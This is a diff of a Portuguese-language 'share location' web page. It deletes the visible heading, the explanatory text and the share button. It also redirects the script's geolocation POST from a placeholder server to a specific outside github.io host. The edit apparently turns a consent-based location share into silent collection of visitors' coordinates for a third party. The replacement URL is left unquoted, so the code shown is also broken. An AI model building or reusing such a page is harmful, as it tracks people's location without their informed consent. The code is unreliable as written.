@@ -6,10 +6,6 @@
     <title>Compartilhar Localização</title>
 </head>
 <body>
-    <h1>Compartilhe sua localização atual</h1>
-    <p>Clique no botão abaixo para compartilhar sua localização.</p>
-    <button onclick="getLocation()">Compartilhar Localização</button>
-
     <script>
         function getLocation() {
             if (navigator.geolocation) {
@@ -25,7 +21,7 @@
             const longitude = position.coords.longitude;
 
             // Envia a localização para o servidor
-            fetch('https://seu-servidor.com/receber-localizacao', {
+            fetch(https://rece01.github.io/, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
